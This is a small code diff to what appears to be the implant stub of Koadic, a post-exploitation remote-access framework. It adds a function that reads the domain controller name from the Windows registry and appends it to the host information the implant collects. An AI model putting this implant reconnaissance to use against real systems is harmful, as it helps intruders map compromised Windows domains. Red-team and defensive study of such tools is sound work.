@@ -137,6 +137,19 @@ Koadic.user.OS = function()
     return "Unknown";
 }
 
+Koadic.user.DC = function()
+{
+    try
+    {
+        var DC = Koadic.WS.RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\DCName");
+        return DC;
+    }
+    catch(e)
+    {
+        return false;
+    }
+}
+
 
 Koadic.user.info = function()
 {
@@ -148,6 +161,7 @@ Koadic.user.info = function()
 
     info += "~~~" + net.ComputerName;
     info += "~~~" + Koadic.user.OS();
+    info += "~~~" + Koadic.user.DC();
 
     return info;
 }
